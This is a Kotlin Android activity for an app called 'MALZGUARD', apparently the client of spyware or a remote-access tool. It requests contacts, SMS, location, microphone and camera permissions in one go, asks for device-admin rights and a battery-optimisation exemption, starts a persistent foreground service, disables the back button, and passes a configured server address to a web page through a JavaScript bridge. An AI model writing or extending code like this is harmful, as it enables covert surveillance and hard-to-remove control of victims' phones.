package com.example.malzguard

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

class MainActivity : Activity() {
    private var wv: WebView? = null
    private var askedAdmin = false

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
            val root = FrameLayout(this)
            val web = WebView(this)
            root.addView(web, FrameLayout.LayoutParams(-1, -1))
            setContentView(root)
            wv = web
            web.settings.javaScriptEnabled = true
            web.settings.domStorageEnabled = true
            web.settings.allowFileAccess = true
            web.webViewClient = WebViewClient()
            web.webChromeClient = WebChromeClient()
            web.addJavascriptInterface(Bridge(), "Native")
            web.loadUrl("file:///android_asset/index.html")
            try { startForegroundService(Intent(this, Svc::class.java)) } catch (e: Exception) {}
            requestAllPerms()
        } catch (e: Exception) {
            try {
                val tv = android.widget.TextView(this)
                tv.text = "error: " + e.message
                tv.textSize = 14f
                tv.setPadding(40, 40, 40, 40)
                setContentView(tv)
            } catch (e2: Exception) {}
        }
    }

    override fun onResume() {
        super.onResume()
        if (!askedAdmin) {
            askedAdmin = true
            requestAdmin()
            requestBattery()
        }
    }

    private fun requestAllPerms() {
        try {
            val perms = mutableListOf(
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
            if (Build.VERSION.SDK_INT >= 33) perms += android.Manifest.permission.POST_NOTIFICATIONS
            requestPermissions(perms.toTypedArray(), 100)
        } catch (e: Exception) {}
    }

    private fun requestAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminRecv::class.java)
            if (!dpm.isAdminActive(admin)) {
                startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "MALZGUARD requires device admin"))
            }
        } catch (e: Exception) {}
    }

    private fun requestBattery() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
            }
        } catch (e: Exception) {}
    }

    inner class Bridge {
        @JavascriptInterface
        fun server(): String = Config.SERVER
        @JavascriptInterface
        fun deviceInfo(): String = Build.MANUFACTURER + " " + Build.MODEL + " | android " + Build.VERSION.RELEASE
        @JavascriptInterface
        fun start() { try { startForegroundService(Intent(this@MainActivity, Svc::class.java)) } catch (e: Exception) {} }
        @JavascriptInterface
        fun requestPerms() { requestAllPerms() }
        @JavascriptInterface
        fun requestAdmin() { this@MainActivity.requestAdmin() }
    }

    override fun onBackPressed() {}
}
